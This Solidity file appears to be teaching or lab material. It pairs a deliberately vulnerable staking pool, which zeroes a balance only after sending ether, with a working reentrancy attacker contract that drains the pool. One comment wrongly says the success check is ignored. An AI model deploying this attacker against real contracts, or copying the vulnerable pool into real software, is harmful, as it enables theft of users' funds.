// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "../../Contracts/node_modules/@openzeppelin/contracts/security/Pausable.sol";
import "../../Contracts/node_modules/@openzeppelin/contracts/access/Ownable.sol";

contract LiquidityPool is Ownable,Pausable {
// the following vulnerabilities can be seen here
//the state change where the stake is made zero happens after an external call
// we have deliberately used .call function as payable transfer method reverts
// we also ignore the success bool which is a vulnerability



    function unpause() public onlyOwner {
        _unpause();
    }

    function pause() public onlyOwner {
        _pause();
    }
 constructor() {}
     event Stake(address liquidityProvider, uint256 amount);
    event Unstake(address liquidityProvider, uint256 amount);
    mapping(address=>uint256) public StakerLiquidity;

    function stake() external payable whenNotPaused{
        StakerLiquidity[msg.sender] += msg.value;
        emit Stake(msg.sender,msg.value);
    }
    function unstake() public whenNotPaused{
        uint256 amount = StakerLiquidity[msg.sender];
      (bool success, ) = msg.sender.call{ value: amount }("");
      require(success, "Unstake failed");
        StakerLiquidity[msg.sender] = 0;
        emit Unstake(msg.sender,amount);
    }
}


 contract attacker{

// here we exploit the vioation of check-effect-interaction pattern and transfer all ether to this contract
//fallback is invoked everytime there is ether sent to the contract and calls unstake thereby causing reentry
// we also make sure we only call upto a point where the contract should not revert for full being drained out and revert all state changes
LiquidityPool public pool;
constructor(address _pool){
    pool = LiquidityPool(_pool);
}
fallback () external payable {
        if (address(pool).balance >= 1) {
            pool.unstake();
        }
    }
function attack() public payable{
    pool.stake{value:msg.value}();
    pool.unstake();
}

}
